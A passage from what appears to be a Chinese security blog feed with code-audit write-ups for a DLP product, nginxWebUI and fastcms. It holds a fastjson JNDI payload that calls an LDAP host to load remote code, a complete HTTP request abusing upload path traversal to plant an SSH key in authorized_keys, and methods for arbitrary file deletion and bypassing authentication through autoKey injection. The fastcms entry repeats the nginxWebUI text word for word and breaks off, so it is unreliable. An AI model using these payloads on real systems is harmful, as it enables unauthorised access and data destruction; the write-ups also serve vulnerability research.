class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;f&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://10.211.55.2:80/Object&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="0x06-反序列化"><a href="#0x06-反序列化" class="headerlink" title="0x06 反序列化"></a>0x06 反序列化</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/dlpPolicy/importPolicy.<span class="hljs-keyword">do</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.esafenet</span><span class="hljs-selector-class">.ta</span><span class="hljs-selector-class">.policy</span><span class="hljs-selector-class">.controller</span>.importPolicy<br></code></pre></td></tr></table></figure><p><img src="image-20231227005119022.png" alt="image-20231227005119022"></p><p><img src="image-20231227005219052.png" alt="image-20231227005219052"></p><p>从file获取流加密，然后转对象</p><p><img src="image-20231227005737683.png" alt="image-20231227005737683"></p><p><img src="image-20231227005640532.png" alt="image-20231227005640532"></p><p>加密方法</p><p><img src="image-20231227005303455.png" alt="image-20231227005303455"></p><p>然后进行反序列化。</p><p>很明确了，就是构造加密后的byte为反序列化数据，然后当file上传，后段会先加密file，然后进行反序列化。</p><p>需要自己实现对应的解密方法。</p><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231227015928700.png" alt="image-20231227015928700"></p><h2 id="0x07-反射调用"><a href="#0x07-反射调用" class="headerlink" title="0x07 反射调用"></a>0x07 反射调用</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/dataconf/g</span>etDataConfInfo.<span class="hljs-keyword">do</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.esafenet</span><span class="hljs-selector-class">.ta</span><span class="hljs-selector-class">.dataconf</span><span class="hljs-selector-class">.controller</span>.DataConfController<br></code></pre></td></tr></table></figure><p><img src="image-20231227155316597.png" alt="image-20231227155316597"></p><p><img src="image-20231227134859229-3663575.png" alt="image-20231227134859229"></p><p>反射调用</p><h2 id="0x09-sql注入"><a href="#0x09-sql注入" class="headerlink" title="0x09 sql注入"></a>0x09 sql注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/dlpPolicy/exportPolicy.<span class="hljs-keyword">do</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.esafenet</span><span class="hljs-selector-class">.ta</span><span class="hljs-selector-class">.policy</span><span class="hljs-selector-class">.controller</span>.DlpPolicyController<br></code></pre></td></tr></table></figure><p><img src="image-20231227153543499.png" alt="image-20231227153543499"></p><p><img src="image-20231227153549180.png" alt="image-20231227153549180"></p><p><img src="image-20231227153554511.png" alt="image-20231227153554511"></p><p>看见很多都是直接拼接，就不一一找了</p><h2 id="0x010-后语"><a href="#0x010-后语" class="headerlink" title="0x010 后语"></a>0x010 后语</h2><p>​练手不错。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nginxWebUI代码审计</title>
    <link href="/2023/12/14/nginxWebUI%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2023/12/14/nginxWebUI%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-文件上传"><a href="#0x01-文件上传" class="headerlink" title="0x01 文件上传 (&lt;&#x3D;3.7.8)"></a>0x01 文件上传 (&lt;&#x3D;3.7.8)</h2><p>接口&#x2F;adminPage&#x2F;main&#x2F;upload</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;MainController.java#upload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;/adminPage/main/upload&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">upload</span><span class="hljs-params">(Context context, UploadedFile file)</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">File</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(FileUtil.getTmpDir() + <span class="hljs-string">&quot;/&quot;</span> + file.getName());<br>file.transferTo(temp);<br><br><span class="hljs-keyword">return</span> renderSuccess(temp.getPath().replace(<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>));<br>&#125; <span class="hljs-keyword">catch</span> (IllegalStateException | IOException e) &#123;<br>logger.error(e.getMessage(), e);<br>&#125;<br><br><span class="hljs-keyword">return</span> renderError();<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到file.getName()没有过滤，导致可以..&#x2F;..&#x2F;目录穿越到ssh目录，也没有对后缀名限制，可以进行写公钥获取shell。然后把路径“\\”替换“&#x2F;”。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>ssh-keygen -t rsa -f id_rsa</p><p>然后上传</p><p><img src="image-20231122173930609.png" alt="image-20231122173930609"></p><p>可以看到成功上传</p><p><img src="image-20231122174241618.png" alt="image-20231122174241618"></p><p>可以看到成功登陆。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/adminPage/main/upload</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>805<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;104&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryZfrhKJObI9gpzcfk<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;macOS&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost:8080<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost:8080/adminPage/www<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_f8cddee34ca21f05373a9388cfdd798b=1677576503; _jpanonym=&quot;ZWMwM2YzYmEyY2ZiZDFhODVkODkwYmNkMGUxNzU2ZGUjMTY4MzE3NDg1Mzg5NyMzMTUzNjAwMCNZVEZoWWpFNU5XSmpaakE1TkRJek5UaGxNelF4WWprME5qa3lNekZqWkdJPQ==&quot;; Hm_lvt_bfe2407e37bbaa8dc195c5db42daf96a=1683170841,1683202635; SOLONID=5ef99bb26ca845b5b3e528f215e802b4; Hm_lvt_8acef669ea66f479854ecd328d1f348f=1700642329; Hm_lpvt_8acef669ea66f479854ecd328d1f348f=1700643843<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZfrhKJObI9gpzcfk</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;../../../../../../../Users/username/.ssh/authorized_keys&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/php</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"></span><br><span class="language-pgsql">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDiI95LRyBLW2By5/KuuMm8QBicakTVsGcQGTjkhHTkn5wCkmC9j4Bt1IrM3AGuGZALe/FJMG3EFsnps2usFNgNaoC0qMJ7agjAbLt4BTC4sqlhKjzGEjTU3qvT1jqa/icjF5dOjA/<span class="hljs-number">0</span>B2o3h/<span class="hljs-number">0</span>M1kT6vcihSHELEcVYi13d8wUPqugd+<span class="hljs-number">5</span>uvZpy0giXQNdimZ6GnstBKL+GT9Pptf6ruLZVQvXvhDPMaeLD7/eU49MxVJG0LBBcXcppLYjrUPLVeqiq7kulIkfhHWQZpk4kUqjAtpLqNNhBupQaCekhaq9dJzPFRR6rV9SSAuytz2XEYqGrxm1ywIMd0rX6CsslQGCrPSyFk3zrY5knkOq908hyO6l2B+YPLf0CkmTbFv/RvQgIBDXUP5uWd8vfzjevXicIKNnHOIQR2PKM0bzPKKCkcH0sxpcuAHU+hL1qoX6J/<span class="hljs-number">2</span>HusfZWzifCYkna0iJewQLYT06MUYy1L7AD94SEVxCeZi1fFq/K3dnlvSp5uXv2jbdc= snake@snakedeMac-mini.loca</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZfrhKJObI9gpzcfk--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure><h2 id="0x02-任意文件删除"><a href="#0x02-任意文件删除" class="headerlink" title="0x02 任意文件删除 (&lt;&#x3D;3.7.8)"></a>0x02 任意文件删除 (&lt;&#x3D;3.7.8)</h2><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;ExportController.java#dataImport()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(value = &quot;dataImport&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dataImport</span><span class="hljs-params">(UploadedFile file, Context context)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>   <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-type">File</span> <span class="hljs-variable">tempFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(homeConfig.home + <span class="hljs-string">&quot;temp&quot;</span> + File.separator + file.getName());<br>      FileUtil.mkdir(tempFile.getParentFile());<br>      file.transferTo(tempFile);<br>      <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> FileUtil.readString(tempFile, StandardCharsets.UTF_8);<br>      tempFile.delete();<br><br>      <span class="hljs-type">AsycPack</span> <span class="hljs-variable">asycPack</span> <span class="hljs-operator">=</span> JSONUtil.toBean(json, AsycPack.class);<br>      confService.setAsycPack(asycPack);<br>      <br>      <span class="hljs-comment">// 导入证书</span><br>      <span class="hljs-keyword">if</span> (asycPack.getCertList() != <span class="hljs-literal">null</span>) &#123;<br>         sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>(), Cert.class);<br>         sqlHelper.insertAll(asycPack.getCertList());<br>      &#125;<br>      <span class="hljs-keyword">if</span> (asycPack.getCertCodeList() != <span class="hljs-literal">null</span>) &#123;<br>         sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>(), CertCode.class);<br>         sqlHelper.insertAll(asycPack.getCertCodeList());<br>      &#125;<br>      <br>      certService.writeAcmeZipBase64(asycPack.getAcmeZip());<br>   &#125;<br>   context.redirect(<span class="hljs-string">&quot;/adminPage/export?over=true&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到file.getName()没有过滤，导致可以..&#x2F;..&#x2F;目录穿越，也没有对后缀名限制，它先上传文件，然后从里面读，紧接着删除文件，只要控制传入文件名导致任意文件删除。</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231123002900589.png" alt="image-20231123002900589"></p><p>创建hookdd</p><p>构造数据包</p><p><img src="image-20231123002959116.png" alt="image-20231123002959116"></p><p><img src="image-20231123003017749.png" alt="image-20231123003017749"></p><p>完成删除</p><h2 id="0x03-Admin-注入绕过认证-全版本"><a href="#0x03-Admin-注入绕过认证-全版本" class="headerlink" title="0x03 Admin 注入绕过认证 (全版本)"></a>0x03 Admin 注入绕过认证 (全版本)</h2><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;AdminController.java#changePassOver()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;changePassOver&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">changePassOver</span><span class="hljs-params">(Admin admin)</span> &#123;<br><br>adminService.changePassOver(admin);<br><br><span class="hljs-keyword">return</span> renderSuccess();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changePassOver</span><span class="hljs-params">(Admin admin)</span> &#123;<br><span class="hljs-keyword">if</span> (admin.getAuth()) &#123;<br><span class="hljs-type">Admin</span> <span class="hljs-variable">adminOrg</span> <span class="hljs-operator">=</span> sqlHelper.findById(admin.getId(), Admin.class);<br><span class="hljs-keyword">if</span> (StrUtil.isEmpty(adminOrg.getKey())) &#123;<br>admin.setKey(authUtils.makeKey());<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>admin.setKey(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (StrUtil.isNotEmpty(admin.getPass())) &#123;<br>admin.setPass(EncodePassUtils.encode(admin.getPass()));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>admin.setPass(<span class="hljs-literal">null</span>);<br>&#125;<br>sqlHelper.updateById(admin);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里也是对admin.getId()判断，然后来改密码。</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;AdminController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;addOver&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] parentId)</span> &#123;<br><span class="hljs-keyword">if</span> (StrUtil.isEmpty(admin.getId())) &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByName(admin.getName());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> adminService.getCountByNameWithOutId(admin.getName(), admin.getId());<br><span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> renderError(m.get(<span class="hljs-string">&quot;adminStr.nameRepetition&quot;</span>));<br>&#125;<br>&#125;<br><br>adminService.addOver(admin, parentId);<br><br><span class="hljs-keyword">return</span> renderSuccess();<br>&#125;<br></code></pre></td></tr></table></figure><p>添加用户的路由, 可以控制admin，parentId，admin.getId()是否为空，不为空进入adminService.getCountByName，跟进getCountByName()</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#getCountByName</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getCountByName</span><span class="hljs-params">(String name)</span> &#123;<br><span class="hljs-keyword">return</span> sqlHelper.findCountByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(Admin::getName, name), Admin.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到进行sql查询，查看数据库是否存在用户。不存在此用户就在service层面创建用户，跟进adminService.addOver。</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#addOver()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] groupIds)</span> &#123;<br>sqlHelper.insertOrUpdate(admin);<br><br>sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(AdminGroup::getAdminId, admin.getId()), AdminGroup.class);<br><span class="hljs-keyword">if</span> (admin.getType() == <span class="hljs-number">1</span> &amp;&amp; groupIds != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">for</span> (String id : groupIds) &#123;<br><span class="hljs-type">AdminGroup</span> <span class="hljs-variable">adminGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdminGroup</span>();<br>adminGroup.setAdminId(admin.getId());<br>adminGroup.setGroupId(id);<br>sqlHelper.insert(adminGroup);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法直接将admin添加到数据库，deleteByQuery就是根据admin_id删除admin_group的数据，不重要，dmin.getType() &#x3D;&#x3D; 1就是非管理员，管理员的type为0，不会走到这里。</p><p>以上两个路由都接收的Admin admin，</p><p>com&#x2F;cym&#x2F;model&#x2F;Admin.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseModel</span> &#123;<br>String name;<br>String pass;<br><span class="hljs-comment">// 谷歌秘钥</span><br>String key;<br><span class="hljs-comment">// 是否开启谷歌验证</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean auth;<br><br><span class="hljs-comment">// 是否开启api</span><br><span class="hljs-meta">@InitValue(&quot;false&quot;)</span><br>Boolean api;<br><br>String token;<br><span class="hljs-comment">// 自动登录key</span><br>String autoKey;<br><br><span class="hljs-comment">// 类型 0 超管 1 受限用户</span><br><span class="hljs-meta">@InitValue(&quot;0&quot;)</span><br>Integer type;<br></code></pre></td></tr></table></figure><p>admin类型里面包含了自动登录key，autoKey。</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;LoginController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;autoLogin&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">autoLogin</span><span class="hljs-params">(String autoKey)</span> &#123;<br><br>   <span class="hljs-comment">// 用户名密码</span><br>   <span class="hljs-type">Admin</span> <span class="hljs-variable">admin</span> <span class="hljs-operator">=</span> adminService.getByAutoKey(autoKey);<br>   <span class="hljs-keyword">if</span> (admin != <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-comment">// 登录成功</span><br>      Context.current().sessionSet(<span class="hljs-string">&quot;localType&quot;</span>, <span class="hljs-string">&quot;local&quot;</span>);<br>      Context.current().sessionSet(<span class="hljs-string">&quot;isLogin&quot;</span>, <span class="hljs-literal">true</span>);<br>      Context.current().sessionSet(<span class="hljs-string">&quot;admin&quot;</span>, admin);<br>      Context.current().sessionRemove(<span class="hljs-string">&quot;imgCode&quot;</span>); <span class="hljs-comment">// 立刻销毁验证码</span><br><br>      <span class="hljs-comment">// 检查更新</span><br>      versionConfig.checkVersion();<br><br>      <span class="hljs-keyword">return</span> renderSuccess(admin);<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> renderError();<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这个功能点可以直接登录，什么二次验证都不用管。</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#getByAutoKey</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Admin <span class="hljs-title function_">getByAutoKey</span><span class="hljs-params">(String autoKey)</span> &#123;<br><span class="hljs-keyword">return</span> sqlHelper.findOneByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(Admin::getAutoKey, autoKey), Admin.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>就是从数据库取autokey。</p><p>所以以上changePassOver，addOver两个路由，在发送数据包的时候只要autoKey，直接就可以注入到数据库，然后通过autoLogin接口传入autoKey即可通过认证，绕过密码、google认证。</p><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231123151820408.png" alt="image-20231123151820408"></p><p><img src="image-20231123151842991.png" alt="image-20231123151842991"></p><p>提交数据包后，成功注入到数据库</p><p><img src="image-20231123151947661.png" alt="image-20231123151947661"></p><p>然后调用autoLogin接口，即可获取认证。</p><p>修改密码接口</p><p><img src="image-20231123152251366.png" alt="image-20231123152251366"></p><p><img src="image-20231123152310239.png" alt="image-20231123152310239"></p><p>成功注入到数据库</p><p><img src="image-20231123152408162.png" alt="image-20231123152408162"></p><p>然后调用autoLogin接口，即可获取admin认证。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>没办法，鉴权做的太好了，只能通过社工来进入后台，后台有命令执行功能点，没什么好审计rce的点，水几个垃圾洞好了。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastcms代码审计</title>
    <link href="/2023/12/14/fastcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2023/12/14/fastcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-文件上传"><a href="#0x01-文件上传" class="headerlink" title="0x01 文件上传 (&lt;&#x3D;3.7.8)"></a>0x01 文件上传 (&lt;&#x3D;3.7.8)</h2><p>接口&#x2F;adminPage&#x2F;main&#x2F;upload</p><p>com&#x2F;cym&#x2F;controller&#x2F;adminPage&#x2F;MainController.java#upload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapping(&quot;/adminPage/main/upload&quot;)</span><br><span class="hljs-keyword">public</span> JsonResult <span class="hljs-title function_">upload</span><span class="hljs-params">(Context context, UploadedFile file)</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">File</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(FileUtil.getTmpDir() + <span class="hljs-string">&quot;/&quot;</span> + file.getName());<br>file.transferTo(temp);<br><br><span class="hljs-keyword">return</span> renderSuccess(temp.getPath().replace(<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>));<br>&#125; <span class="hljs-keyword">catch</span> (IllegalStateException | IOException e) &#123;<br>logger.error(e.getMessage(), e);<br>&#125;<br><br><span class="hljs-keyword">return</span> 